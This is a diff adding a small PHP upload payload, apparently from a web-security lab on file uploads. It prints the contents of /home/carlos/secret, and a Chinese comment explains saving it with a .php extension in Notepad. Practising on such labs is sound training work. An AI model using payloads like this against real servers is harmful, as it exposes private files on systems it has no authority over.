@@ -1,0 +1,11 @@
+<?php
+echo file_get_contents('/home/carlos/secret');
+?>
+
+/*
+记事本中编辑 -> 左上角文件 -> 另存为(Ctrl+Shift+S) -> 
+文件名: ???.php;保存类型: 所有;编码: UTF-8
+别整个 ???.php.txt了
+
+echo 打印 ...文件内容
+*/
